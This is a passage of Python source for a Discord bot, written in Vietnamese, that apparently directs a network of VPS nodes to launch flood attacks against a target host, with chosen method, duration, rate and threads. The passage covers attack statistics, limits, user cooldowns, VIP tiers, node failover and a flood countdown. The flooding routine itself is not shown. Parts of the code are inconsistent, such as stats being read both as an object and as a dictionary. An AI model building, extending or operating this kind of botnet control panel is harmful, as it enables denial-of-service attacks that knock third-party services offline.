        value=f"**Cooldown:** {attack_limits.cooldown_time}s\n**Tấn công đồng thời:** {attack_limits.max_concurrent_attacks}",
        inline=False
    )
    
    embed.add_field(
        name="📊 Thống kê",
        value=f"**Tổng tấn công:** {attack_stats.total_attacks}\n**Thành công:** {attack_stats.successful_attacks}\n**Thất bại:** {attack_stats.failed_attacks}\n**Lần cuối:** {attack_stats.last_attack or 'Chưa có'}",
        inline=False
    )
    
    await ctx.send(embed=embed)

@bot.command()
async def optimize(ctx, method: str, host: str, time: int, rate: int, thread: int):
    """Tối ưu hóa lệnh trước khi chạy"""
    # Validate tham số
    validation_errors = validate_attack_params(method, host, time, rate, thread)
    if validation_errors:
        embed = discord.Embed(
            title=f"❌ [{VPS_NAME}] Lỗi tham số:",
            description="\n".join(f"• {error}" for error in validation_errors),
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # Tối ưu hóa lệnh
    optimized_method, optimized_host, optimized_time, optimized_rate, optimized_thread = optimize_command(method, host, time, rate, thread)
    
    embed = discord.Embed(
        title=f"⚡ [{VPS_NAME}] Tối ưu hóa lệnh",
        color=discord.Color.green()
    )
    
    embed.add_field(
        name="📥 Tham số gốc",
        value=f"**Method:** {method}\n**Host:** {host}\n**Time:** {time}s\n**Rate:** {rate}\n**Threads:** {thread}",
        inline=True
    )
    
    embed.add_field(
        name="📤 Tham số tối ưu",
        value=f"**Method:** {optimized_method}\n**Host:** {optimized_host}\n**Time:** {optimized_time}s\n**Rate:** {optimized_rate}\n**Threads:** {optimized_thread}",
        inline=True
    )
    
    # Tính toán cải thiện
    time_saved = time - optimized_time
    rate_saved = rate - optimized_rate
    thread_saved = thread - optimized_thread
    
    if time_saved > 0 or rate_saved > 0 or thread_saved > 0:
        embed.add_field(
            name="💡 Cải thiện",
            value=f"**Thời gian tiết kiệm:** {time_saved}s\n**Rate giảm:** {rate_saved}\n**Threads giảm:** {thread_saved}",
            inline=False
        )
    
    await ctx.send(embed=embed)

@bot.command()
async def stats(ctx):
    """Hiển thị thống kê chi tiết"""
    embed = discord.Embed(
        title=f"📈 [{VPS_NAME}] Thống kê chi tiết",
        color=discord.Color.purple()
    )
    
    # Tính tỷ lệ thành công
    success_rate = 0
    if attack_stats['total_attacks'] > 0:
        success_rate = (attack_stats['successful_attacks'] / attack_stats['total_attacks']) * 100
    
    # Tính thời gian trung bình
    avg_time = 0
    if attack_stats['successful_attacks'] > 0:
        avg_time = attack_stats['total_time'] / attack_stats['successful_attacks']
    
    embed.add_field(
        name="🎯 Hiệu suất",
        value=f"**Tổng tấn công:** {attack_stats['total_attacks']}\n**Thành công:** {attack_stats['successful_attacks']}\n**Thất bại:** {attack_stats['failed_attacks']}\n**Tỷ lệ thành công:** {success_rate:.1f}%",
        inline=True
    )
    
    embed.add_field(
        name="⏱️ Thời gian",
        value=f"**Tổng thời gian:** {attack_stats['total_time']}s\n**Trung bình:** {avg_time:.1f}s\n**Lần cuối:** {attack_stats['last_attack'] or 'Chưa có'}",
        inline=True
    )
    
    embed.add_field(
        name="🔧 Hệ thống",
        value=f"**VPS Type:** {'VIP' if VPS_NAME.startswith('firebase-vip') else 'Standard'}\n**Rate Limit:** {COOLDOWN_TIME}s\n**Max Threads:** {MAX_THREADS}",
        inline=True
    )
    
    await ctx.send(embed=embed)

@bot.command()
async def reset_stats(ctx):
    """Reset thống kê"""
    global attack_stats
    attack_stats = {
        "total_attacks": 0,
        "successful_attacks": 0,
        "failed_attacks": 0,
        "total_time": 0,
        "last_attack": None
    }
    
    embed = discord.Embed(
        description=f"🔄 [{VPS_NAME}] Đã reset thống kê!",
        color=discord.Color.green()
    )
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def optimize_system(ctx):
    """Tối ưu hóa hệ thống - giải phóng RAM và CPU"""
    embed = discord.Embed(
        description=f"🔧 [{VPS_NAME}] Đang tối ưu hóa hệ thống...",
        color=discord.Color.blue()
    )
    await safe_send_message(ctx, embed, 0.1)
    
    try:
        results = perform_system_optimization()
        
        embed = discord.Embed(
            title=f"✅ [{VPS_NAME}] Tối ưu hóa hoàn thành!",
            color=discord.Color.green()
        )
        
        # Thông tin trước và sau
        embed.add_field(
            name="📊 Hiệu suất",
            value=f"**CPU:** {results['before_cpu']:.1f}% → {results['after_cpu']:.1f}%\n**RAM:** {results['before_memory']:.1f}% → {results['after_memory']:.1f}%",
            inline=True
        )
        
        # Kết quả dọn dẹp
        embed.add_field(
            name="🧹 Dọn dẹp",
            value=f"**Memory objects:** {results['memory_cleaned']}\n**Temp files:** {results['temp_files_cleaned']}\n**Zombie processes:** {results['zombie_processes_killed']}",
            inline=True
        )
        
        # Tính cải thiện
        cpu_improvement = results['before_cpu'] - results['after_cpu']
        memory_improvement = results['before_memory'] - results['after_memory']
        
        if cpu_improvement > 0 or memory_improvement > 0:
            embed.add_field(
                name="💡 Cải thiện",
                value=f"**CPU giảm:** {cpu_improvement:.1f}%\n**RAM giảm:** {memory_improvement:.1f}%",
                inline=False
            )
        
        await safe_send_message(ctx, embed, 0.1)
        
    except Exception as e:
        embed = discord.Embed(
            description=f"❌ [{VPS_NAME}] Lỗi khi tối ưu hóa: {str(e)}",
            color=discord.Color.red()
        )
        await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def cleanup_memory(ctx):
    """Dọn dẹp bộ nhớ"""
    embed = discord.Embed(
        description=f"🧹 [{VPS_NAME}] Đang dọn dẹp bộ nhớ...",
        color=discord.Color.blue()
    )
    await safe_send_message(ctx, embed, 0.1)
    
    try:
        before_info = get_system_info()
        collected = perform_memory_cleanup()
        after_info = get_system_info()
        
        embed = discord.Embed(
            title=f"✅ [{VPS_NAME}] Dọn dẹp bộ nhớ hoàn thành!",
            color=discord.Color.green()
        )
        
        if before_info and after_info:
            memory_before = before_info['memory_percent']
            memory_after = after_info['memory_percent']
            improvement = memory_before - memory_after
            
            embed.add_field(
                name="📊 Kết quả",
                value=f"**RAM trước:** {memory_before:.1f}%\n**RAM sau:** {memory_after:.1f}%\n**Cải thiện:** {improvement:.1f}%",
                inline=True
            )
        
        embed.add_field(
            name="🗑️ Objects collected",
            value=f"**Garbage collected:** {collected} objects",
            inline=True
        )
        
        await safe_send_message(ctx, embed, 0.1)
        
    except Exception as e:
        embed = discord.Embed(
            description=f"❌ [{VPS_NAME}] Lỗi khi dọn dẹp bộ nhớ: {str(e)}",
            color=discord.Color.red()
        )
        await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def cleanup_temp(ctx):
    """Dọn dẹp file tạm"""
    embed = discord.Embed(
        description=f"🗂️ [{VPS_NAME}] Đang dọn dẹp file tạm...",
        color=discord.Color.blue()
    )
    await safe_send_message(ctx, embed, 0.1)
    
    try:
        cleaned_files = perform_temp_cleanup()
        
        embed = discord.Embed(
            title=f"✅ [{VPS_NAME}] Dọn dẹp file tạm hoàn thành!",
            description=f"**Files đã xóa:** {cleaned_files}",
            color=discord.Color.green()
        )
        
        await safe_send_message(ctx, embed, 0.1)
        
    except Exception as e:
        embed = discord.Embed(
            description=f"❌ [{VPS_NAME}] Lỗi khi dọn dẹp file tạm: {str(e)}",
            color=discord.Color.red()
        )
        await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def kill_zombies(ctx):
    """Kill các process zombie"""
    embed = discord.Embed(
        description=f"💀 [{VPS_NAME}] Đang kill zombie processes...",
        color=discord.Color.blue()
    )
    await safe_send_message(ctx, embed, 0.1)
    
    try:
        killed_count = kill_zombie_processes()
        
        embed = discord.Embed(
            title=f"✅ [{VPS_NAME}] Kill zombie processes hoàn thành!",
            description=f"**Processes đã kill:** {killed_count}",
            color=discord.Color.green()
        )
        
        await safe_send_message(ctx, embed, 0.1)
        
    except Exception as e:
        embed = discord.Embed(
            description=f"❌ [{VPS_NAME}] Lỗi khi kill zombie processes: {str(e)}",
            color=discord.Color.red()
        )
        await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def system_info(ctx):
    """Hiển thị thông tin hệ thống chi tiết"""
    try:
        info = get_system_info()
        if not info:
            embed = discord.Embed(
                description=f"❌ [{VPS_NAME}] Không thể lấy thông tin hệ thống!",
                color=discord.Color.red()
            )
            await safe_send_message(ctx, embed, 0.1)
            return
        
        embed = discord.Embed(
            title=f"💻 [{VPS_NAME}] Thông tin hệ thống",
            color=discord.Color.blue()
        )
        
        # CPU và RAM
        embed.add_field(
            name="⚡ CPU & RAM",
            value=f"**CPU:** {info['cpu_percent']:.1f}%\n**RAM:** {info['memory_percent']:.1f}% ({info['memory_used']}GB/{info['memory_total']}GB)",
            inline=True
        )
        
        # Disk
        embed.add_field(
            name="💾 Disk",
            value=f"**Usage:** {info['disk_percent']:.1f}%\n**Used:** {info['disk_used']}GB/{info['disk_total']}GB",
            inline=True
        )
        
        # Boot time
        boot_time = datetime.fromtimestamp(info['boot_time'])
        uptime = datetime.now() - boot_time
        embed.add_field(
            name="⏰ Uptime",
            value=f"**Boot:** {boot_time.strftime('%Y-%m-%d %H:%M:%S')}\n**Uptime:** {uptime.days}d {uptime.seconds//3600}h",
            inline=True
        )
        
        await safe_send_message(ctx, embed, 0.1)
        
    except Exception as e:
        embed = discord.Embed(
            description=f"❌ [{VPS_NAME}] Lỗi khi lấy thông tin hệ thống: {str(e)}",
            color=discord.Color.red()
        )
        await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def queue_status(ctx):
    """Kiểm tra trạng thái queue"""
    embed = discord.Embed(
        title=f"📋 [{VPS_NAME}] Trạng thái Queue",
        color=discord.Color.blue()
    )
    
    queue_size = message_queue.qsize()
    embed.add_field(
        name="📊 Thông tin Queue",
        value=f"**Tin nhắn đang chờ:** {queue_size}\n**Queue processor:** {'🟢 Hoạt động' if is_processing_queue else '🔴 Dừng'}\n**Rate limit delay:** 0.5s",
        inline=False
    )
    
    embed.add_field(
        name="🔧 Cài đặt",
        value=f"**User cooldown:** {attack_limits.cooldown_time}s\n**Max concurrent:** {attack_limits.max_concurrent_attacks}\n**VPS Type:** {'VIP' if VPS_NAME.startswith('firebase-vip') else 'Standard'}",
        inline=False
    )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def silent_status(ctx):
    """Kiểm tra trạng thái silent mode"""
    is_main_vps = await should_respond()
    
    embed = discord.Embed(
        title=f"🔇 [{VPS_NAME}] Trạng thái Silent Mode",
        color=discord.Color.blue()
    )
    
    embed.add_field(
        name="📊 Thông tin VPS",
        value=f"**VPS Name:** {VPS_NAME}\n**Response VPS:** {RESPONSE_VPS or 'Chưa xác định'}\n**Silent Mode:** {'🔇 Bật' if SILENT_MODE else '🔊 Tắt'}\n**Is Main VPS:** {'✅ Có' if is_main_vps else '❌ Không'}",
        inline=False
    )
    
    embed.add_field(
        name="🎯 Chức năng",
        value=f"**Phản hồi Discord:** {'❌ Không' if SILENT_MODE else '✅ Có'}\n**Chạy lệnh:** {'✅ Có' if not is_running else '❌ Đang bận'}\n**Log console:** ✅ Có",
        inline=False
    )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def set_response_vps(ctx, vps_name: str):
    """Thay đổi VPS chính phản hồi (chỉ admin)"""
    # Kiểm tra quyền admin (có thể thêm logic kiểm tra user ID)
    global RESPONSE_VPS, SILENT_MODE
    
    old_response = RESPONSE_VPS
    RESPONSE_VPS = vps_name
    SILENT_MODE = VPS_NAME != RESPONSE_VPS
    
    embed = discord.Embed(
        title=f"⚙️ [{VPS_NAME}] Thay đổi Response VPS",
        color=discord.Color.green()
    )
    
    embed.add_field(
        name="📊 Thay đổi",
        value=f"**VPS cũ:** {old_response}\n**VPS mới:** {vps_name}\n**Silent Mode:** {'🔇 Bật' if SILENT_MODE else '🔊 Tắt'}",
        inline=False
    )
    
    embed.add_field(
        name="⚠️ Lưu ý",
        value="Cần restart tất cả VPS để áp dụng thay đổi!",
        inline=False
    )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def reset_response_vps(ctx):
    """Reset VPS chính (VPS phản hồi nhanh nhất sẽ trở thành chính)"""
    global RESPONSE_VPS, SILENT_MODE
    
    old_response = RESPONSE_VPS
    RESPONSE_VPS = None
    SILENT_MODE = False
    MANUAL_SILENT_MODE = False
    
    embed = discord.Embed(
        title=f"🔄 [{VPS_NAME}] Reset Response VPS",
        color=discord.Color.orange()
    )
    
    embed.add_field(
        name="📊 Reset",
        value=f"**VPS cũ:** {old_response or 'Chưa có'}\n**VPS mới:** Sẽ được chọn tự động\n**Silent Mode:** 🔇 Tắt",
        inline=False
    )
    
    embed.add_field(
        name="ℹ️ Thông tin",
        value="VPS phản hồi nhanh nhất trong lần gửi lệnh tiếp theo sẽ trở thành VPS chính!",
        inline=False
    )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def set_limit(ctx, limit_type: str, value: int):
    """Set giới hạn hệ thống"""
    limit_type = limit_type.lower()
    
    if limit_type in ["time", "attack_time"]:
        success, message = set_attack_time_limit(value)
    elif limit_type in ["rate"]:
        success, message = set_rate_limit(value)
    elif limit_type in ["thread", "threads"]:
        success, message = set_thread_limit(value)
    elif limit_type in ["cooldown"]:
        success, message = set_cooldown_limit(value)
    else:
        embed = discord.Embed(
            title=f"❌ [{VPS_NAME}] Lỗi loại limit",
            description="**Loại limit hợp lệ:**\n• `time` - Thời gian tấn công\n• `rate` - Rate tối đa\n• `thread` - Threads tối đa\n• `cooldown` - Cooldown",
            color=discord.Color.red()
        )
        await safe_send_message(ctx, embed, 0.1)
        return
    
    if success:
        embed = discord.Embed(
            title=f"✅ [{VPS_NAME}] Set Limit thành công",
            description=message,
            color=discord.Color.green()
        )
    else:
        embed = discord.Embed(
            title=f"❌ [{VPS_NAME}] Lỗi Set Limit",
            description=message,
            color=discord.Color.red()
        )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def get_limits(ctx):
    """Xem giới hạn hiện tại"""
    limits = get_current_limits()
    
    embed = discord.Embed(
        title=f"⚙️ [{VPS_NAME}] Giới hạn hiện tại",
        color=discord.Color.blue()
    )
    
    embed.add_field(
        name="🚫 Giới hạn tấn công",
        value=f"**Thời gian tối đa:** {limits['max_attack_time']}s\n**Rate tối đa:** {limits['max_rate']}\n**Threads tối đa:** {limits['max_threads']}",
        inline=True
    )
    
    embed.add_field(
        name="⏰ Rate Limiting",
        value=f"**Cooldown:** {limits['cooldown_time']}s\n**Tấn công đồng thời:** {limits['max_concurrent']}",
        inline=True
    )
    
    embed.add_field(
        name="📊 Phạm vi cho phép",
        value=f"**Time:** {MIN_ATTACK_TIME}-{MAX_ATTACK_TIME_LIMIT}s\n**Rate:** {MIN_RATE}-{MAX_RATE_LIMIT}\n**Threads:** {MIN_THREADS}-{MAX_THREADS_LIMIT}\n**Cooldown:** {MIN_COOLDOWN}-{MAX_COOLDOWN_LIMIT}s",
        inline=False
    )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def reset_limits(ctx):
    """Reset tất cả giới hạn về mặc định"""
    global MAX_ATTACK_TIME, MAX_RATE, MAX_THREADS, COOLDOWN_TIME
    
    old_limits = get_current_limits()
    
    # Reset về mặc định
    MAX_ATTACK_TIME = 10000
    MAX_RATE = 10000
    MAX_THREADS = 10000
    COOLDOWN_TIME = 5
    
    embed = discord.Embed(
        title=f"🔄 [{VPS_NAME}] Reset Limits",
        color=discord.Color.orange()
    )
    
    embed.add_field(
        name="📊 Trước khi reset",
        value=f"**Time:** {old_limits['max_attack_time']}s\n**Rate:** {old_limits['max_rate']}\n**Threads:** {old_limits['max_threads']}\n**Cooldown:** {old_limits['cooldown_time']}s",
        inline=True
    )
    
    embed.add_field(
        name="📊 Sau khi reset",
        value=f"**Time:** {MAX_ATTACK_TIME}s\n**Rate:** {MAX_RATE}\n**Threads:** {MAX_THREADS}\n**Cooldown:** {COOLDOWN_TIME}s",
        inline=True
    )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def reset_message_tracker(ctx):
    """Reset message tracker để tránh lặp tin nhắn"""
    global MESSAGE_SENT_TRACKER
    
    old_size = len(MESSAGE_SENT_TRACKER)
    MESSAGE_SENT_TRACKER.clear()
    
    embed = discord.Embed(
        title=f"🔄 [{VPS_NAME}] Reset Message Tracker",
        description=f"**Tin nhắn đã theo dõi:** {old_size} → 0\n**Trạng thái:** ✅ Đã reset",
        color=discord.Color.green()
    )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def clear_cooldowns(ctx):
    """Xóa tất cả cooldown của user"""
    global user_cooldowns
    
    old_count = len(user_cooldowns)
    user_cooldowns.clear()
    
    embed = discord.Embed(
        title=f"🔄 [{VPS_NAME}] Clear Cooldowns",
        description=f"**User cooldowns:** {old_count} → 0\n**Trạng thái:** ✅ Đã xóa",
        color=discord.Color.green()
    )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def set_vps_mode(ctx, mode: str):
    """Thay đổi chế độ chọn VPS chính"""
    global VPS_SELECTION_MODE
    
    mode = mode.lower()
    if mode not in ["random", "speed", "fixed"]:
        embed = discord.Embed(
            title=f"❌ [{VPS_NAME}] Lỗi chế độ VPS",
            description="**Chế độ hợp lệ:**\n• `random` - Chọn ngẫu nhiên\n• `speed` - Chọn VPS nhanh nhất\n• `fixed` - VPS cố định",
            color=discord.Color.red()
        )
        await safe_send_message(ctx, embed, 0.1)
        return
    
    old_mode = VPS_SELECTION_MODE
    VPS_SELECTION_MODE = mode
    
    # Reset VPS chính để áp dụng chế độ mới
    global RESPONSE_VPS, VPS_LAST_RESET
    RESPONSE_VPS = None
    VPS_LAST_RESET = None
    
    embed = discord.Embed(
        title=f"⚙️ [{VPS_NAME}] Thay đổi chế độ VPS",
        description=f"**Chế độ cũ:** {old_mode}\n**Chế độ mới:** {mode}\n**Trạng thái:** ✅ Đã áp dụng",
        color=discord.Color.green()
    )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def vps_status(ctx):
    """Xem trạng thái hệ thống VPS"""
    global VPS_SELECTION_MODE, VPS_RESPONSE_TIMES, VPS_LAST_RESET, VPS_RESET_INTERVAL
    
    embed = discord.Embed(
        title=f"🖥️ [{VPS_NAME}] Trạng thái hệ thống VPS",
        color=discord.Color.blue()
    )
    
    # Thông tin chế độ
    embed.add_field(
        name="⚙️ Cấu hình",
        value=f"**Chế độ chọn:** {VPS_SELECTION_MODE}\n**VPS chính:** {RESPONSE_VPS or 'Chưa chọn'}\n**Silent Mode:** {'🔇 Bật' if SILENT_MODE else '🔊 Tắt'}",
        inline=False
    )
    
    # Thông tin reset
    if VPS_LAST_RESET:
        last_reset_time = datetime.fromtimestamp(VPS_LAST_RESET).strftime("%H:%M:%S")
        next_reset = VPS_LAST_RESET + VPS_RESET_INTERVAL
        next_reset_time = datetime.fromtimestamp(next_reset).strftime("%H:%M:%S")
        embed.add_field(
            name="🔄 Reset",
            value=f"**Lần cuối:** {last_reset_time}\n**Lần tiếp:** {next_reset_time}\n**Interval:** {VPS_RESET_INTERVAL}s",
            inline=True
        )
    else:
        embed.add_field(
            name="🔄 Reset",
            value="**Lần cuối:** Chưa có\n**Lần tiếp:** Ngay lập tức\n**Interval:** {VPS_RESET_INTERVAL}s",
            inline=True
        )
    
    # Thông tin VPS đã biết
    if VPS_RESPONSE_TIMES:
        vps_list = []
        for vps, time in VPS_RESPONSE_TIMES.items():
            time_str = datetime.fromtimestamp(time).strftime("%H:%M:%S")
            vps_list.append(f"**{vps}:** {time_str}")
        
        embed.add_field(
            name="📊 VPS đã biết",
            value="\n".join(vps_list),
            inline=False
        )
    else:
        embed.add_field(
            name="📊 VPS đã biết",
            value="Chưa có VPS nào",
            inline=False
        )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def force_reset_vps(ctx):
    """Bắt buộc reset VPS chính ngay lập tức"""
    global RESPONSE_VPS, VPS_LAST_RESET
    
    old_vps = RESPONSE_VPS
    RESPONSE_VPS = None
    VPS_LAST_RESET = None
    
    embed = discord.Embed(
        title=f"🔄 [{VPS_NAME}] Force Reset VPS",
        description=f"**VPS cũ:** {old_vps or 'Chưa có'}\n**VPS mới:** Sẽ được chọn tự động\n**Trạng thái:** ✅ Đã reset",
        color=discord.Color.orange()
    )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def set_reset_interval(ctx, seconds: int):
    """Thay đổi thời gian reset VPS chính"""
    global VPS_RESET_INTERVAL
    
    if seconds < 60 or seconds > 3600:
        embed = discord.Embed(
            title=f"❌ [{VPS_NAME}] Lỗi thời gian reset",
            description="**Thời gian hợp lệ:** 60-3600 giây (1 phút - 1 giờ)",
            color=discord.Color.red()
        )
        await safe_send_message(ctx, embed, 0.1)
        return
    
    old_interval = VPS_RESET_INTERVAL
    VPS_RESET_INTERVAL = seconds
    
    embed = discord.Embed(
        title=f"⚙️ [{VPS_NAME}] Thay đổi Reset Interval",
        description=f"**Interval cũ:** {old_interval}s\n**Interval mới:** {seconds}s\n**Trạng thái:** ✅ Đã áp dụng",
        color=discord.Color.green()
    )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def debug_vps(ctx):
    """Debug thông tin VPS chi tiết"""
    global RESPONSE_VPS, SILENT_MODE, VPS_LAST_RESET, VPS_RESPONSE_TIMES, VPS_LAST_HEARTBEAT, AUTO_FAILOVER
    
    embed = discord.Embed(
        title=f"🔍 [{VPS_NAME}] Debug VPS Info",
        color=discord.Color.blue()
    )
    
    # Thông tin cơ bản
    embed.add_field(
        name="📊 Thông tin cơ bản",
        value=f"**VPS Name:** {VPS_NAME}\n**Response VPS:** {RESPONSE_VPS or 'None'}\n**Silent Mode:** {'🔇 Bật' if SILENT_MODE else '🔊 Tắt'}\n**Is Main:** {'✅ Có' if RESPONSE_VPS == VPS_NAME else '❌ Không'}",
        inline=False
    )
    
    # Thông tin failover
    alive_vps = get_alive_vps_list()
    embed.add_field(
        name="💓 Heartbeat & Failover",
        value=f"**Auto Failover:** {'✅ Bật' if AUTO_FAILOVER else '❌ Tắt'}\n**VPS Timeout:** {VPS_TIMEOUT}s\n**Alive VPS:** {len(alive_vps)}\n**Alive List:** {', '.join(alive_vps) if alive_vps else 'None'}",
        inline=False
    )
    
    # Thông tin lock
    embed.add_field(
        name="🔒 Lock Info",
        value=f"**Lock Timeout:** {RESPONSE_LOCK_TIMEOUT}s\n**Lock Status:** {'🔒 Locked' if FIRST_RESPONSE_LOCK.locked() else '🔓 Unlocked'}",
        inline=True
    )
    
    # Thông tin reset
    if VPS_LAST_RESET:
        last_reset_time = datetime.fromtimestamp(VPS_LAST_RESET).strftime("%H:%M:%S")
        embed.add_field(
            name="🔄 Reset Info",
            value=f"**Last Reset:** {last_reset_time}\n**Next Reset:** {VPS_RESET_INTERVAL}s",
            inline=True
        )
    else:
        embed.add_field(
            name="🔄 Reset Info",
            value="**Last Reset:** Chưa có\n**Next Reset:** Ngay lập tức",
            inline=True
        )
    
    # Thông tin VPS đã biết
    if VPS_RESPONSE_TIMES:
        vps_count = len(VPS_RESPONSE_TIMES)
        embed.add_field(
            name="📈 VPS Response Times",
            value=f"**Count:** {vps_count}\n**VPS List:** {', '.join(VPS_RESPONSE_TIMES.keys())}",
            inline=False
        )
    else:
        embed.add_field(
            name="📈 VPS Response Times",
            value="**Count:** 0\n**VPS List:** Chưa có",
            inline=False
        )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def set_auto_failover(ctx, enable: str):
    """Bật/tắt tự động failover"""
    global AUTO_FAILOVER
    
    enable = enable.lower()
    if enable in ["true", "1", "on", "yes", "bật"]:
        AUTO_FAILOVER = True
        status = "✅ Bật"
    elif enable in ["false", "0", "off", "no", "tắt"]:
        AUTO_FAILOVER = False
        status = "❌ Tắt"
    else:
        embed = discord.Embed(
            title=f"❌ [{VPS_NAME}] Lỗi tham số",
            description="**Giá trị hợp lệ:** true/false, 1/0, on/off, yes/no, bật/tắt",
            color=discord.Color.red()
        )
        await safe_send_message(ctx, embed, 0.1)
        return
    
    embed = discord.Embed(
        title=f"⚙️ [{VPS_NAME}] Auto Failover",
        description=f"**Trạng thái:** {status}\n**VPS Timeout:** {VPS_TIMEOUT}s\n**Heartbeat Interval:** {HEARTBEAT_INTERVAL}s",
        color=discord.Color.green()
    )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def set_vps_timeout(ctx, seconds: int):
    """Thay đổi thời gian timeout VPS"""
    global VPS_TIMEOUT
    
    if seconds < 30 or seconds > 600:
        embed = discord.Embed(
            title=f"❌ [{VPS_NAME}] Lỗi thời gian timeout",
            description="**Thời gian hợp lệ:** 30-600 giây (30 giây - 10 phút)",
            color=discord.Color.red()
        )
        await safe_send_message(ctx, embed, 0.1)
        return
    
    old_timeout = VPS_TIMEOUT
    VPS_TIMEOUT = seconds
    
    embed = discord.Embed(
        title=f"⚙️ [{VPS_NAME}] Thay đổi VPS Timeout",
        description=f"**Timeout cũ:** {old_timeout}s\n**Timeout mới:** {seconds}s\n**Trạng thái:** ✅ Đã áp dụng",
        color=discord.Color.green()
    )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def alive_vps(ctx):
    """Xem danh sách VPS còn sống"""
    alive_vps = get_alive_vps_list()
    
    embed = discord.Embed(
        title=f"💓 [{VPS_NAME}] Danh sách VPS còn sống",
        color=discord.Color.green()
    )
    
    if alive_vps:
        vps_info = []
        current_time = datetime.now().timestamp()
        
        for vps_name in alive_vps:
            if vps_name in VPS_LAST_HEARTBEAT:
                last_heartbeat = VPS_LAST_HEARTBEAT[vps_name]
                time_diff = current_time - last_heartbeat
                status = "🟢 Online" if time_diff < 30 else "🟡 Slow"
                vps_info.append(f"**{vps_name}:** {status} ({time_diff:.0f}s ago)")
        
        embed.add_field(
            name="📊 VPS Status",
            value="\n".join(vps_info),
            inline=False
        )
        
        embed.add_field(
            name="📈 Thống kê",
            value=f"**Tổng số:** {len(alive_vps)}\n**VPS chính:** {RESPONSE_VPS or 'Chưa có'}\n**Auto Failover:** {'✅ Bật' if AUTO_FAILOVER else '❌ Tắt'}",
            inline=False
        )
    else:
        embed.add_field(
            name="📊 VPS Status",
            value="Không có VPS nào còn sống",
            inline=False
        )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def set_countdown(ctx, enable: str):
    """Bật/tắt countdown thời gian flood"""
    global COUNTDOWN_ENABLED
    
    enable = enable.lower()
    if enable in ["true", "1", "on", "yes", "bật"]:
        COUNTDOWN_ENABLED = True
        status = "✅ Bật"
    elif enable in ["false", "0", "off", "no", "tắt"]:
        COUNTDOWN_ENABLED = False
        status = "❌ Tắt"
    else:
        embed = discord.Embed(
            title=f"❌ [{VPS_NAME}] Lỗi tham số",
            description="**Giá trị hợp lệ:** true/false, 1/0, on/off, yes/no, bật/tắt",
            color=discord.Color.red()
        )
        await safe_send_message(ctx, embed, 0.1)
        return
    
    embed = discord.Embed(
        title=f"⚙️ [{VPS_NAME}] Countdown Settings",
        description=f"**Trạng thái:** {status}\n**Interval:** {COUNTDOWN_INTERVAL}s\n**Final Countdown:** {COUNTDOWN_FINAL}s",
        color=discord.Color.green()
    )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def set_countdown_interval(ctx, seconds: int):
    """Thay đổi interval countdown"""
    global COUNTDOWN_INTERVAL
    
    if seconds < 5 or seconds > 60:
        embed = discord.Embed(
            title=f"❌ [{VPS_NAME}] Lỗi interval countdown",
            description="**Thời gian hợp lệ:** 5-60 giây",
            color=discord.Color.red()
        )
        await safe_send_message(ctx, embed, 0.1)
        return
    
    old_interval = COUNTDOWN_INTERVAL
    COUNTDOWN_INTERVAL = seconds
    
    embed = discord.Embed(
        title=f"⚙️ [{VPS_NAME}] Thay đổi Countdown Interval",
        description=f"**Interval cũ:** {old_interval}s\n**Interval mới:** {seconds}s\n**Trạng thái:** ✅ Đã áp dụng",
        color=discord.Color.green()
    )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def set_final_countdown(ctx, seconds: int):
    """Thay đổi thời gian final countdown"""
    global COUNTDOWN_FINAL
    
    if seconds < 10 or seconds > 120:
        embed = discord.Embed(
            title=f"❌ [{VPS_NAME}] Lỗi final countdown",
            description="**Thời gian hợp lệ:** 10-120 giây",
            color=discord.Color.red()
        )
        await safe_send_message(ctx, embed, 0.1)
        return
    
    old_final = COUNTDOWN_FINAL
    COUNTDOWN_FINAL = seconds
    
    embed = discord.Embed(
        title=f"⚙️ [{VPS_NAME}] Thay đổi Final Countdown",
        description=f"**Final cũ:** {old_final}s\n**Final mới:** {seconds}s\n**Trạng thái:** ✅ Đã áp dụng",
        color=discord.Color.green()
    )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def countdown_status(ctx):
    """Xem trạng thái countdown"""
    embed = discord.Embed(
        title=f"⏱️ [{VPS_NAME}] Countdown Status",
        color=discord.Color.blue()
    )
    
    embed.add_field(
        name="📊 Cài đặt",
        value=f"**Countdown:** {'✅ Bật' if COUNTDOWN_ENABLED else '❌ Tắt'}\n**Interval:** {COUNTDOWN_INTERVAL}s\n**Final Countdown:** {COUNTDOWN_FINAL}s",
        inline=False
    )
    
    embed.add_field(
        name="ℹ️ Thông tin",
        value=f"**Mô tả:** Hiển thị thời gian còn lại khi chạy flood\n**Gửi mỗi:** {COUNTDOWN_INTERVAL}s (hoặc mỗi giây khi còn < {COUNTDOWN_FINAL}s)",
        inline=False
    )
    
    await safe_send_message(ctx, embed, 0.1)

@bot.command()
async def debug_spam(ctx):
    """Debug thông tin spam và reset hệ thống"""
    global RESPONSE_COUNTER, MESSAGE_SENT_TRACKER, RESPONSE_VPS, SILENT_MODE, MANUAL_SILENT_MODE
    
    embed = discord.Embed(
        title=f"🔍 [{VPS_NAME}] Debug Spam Info",
        color=discord.Color.red()
    )
    
    embed.add_field(
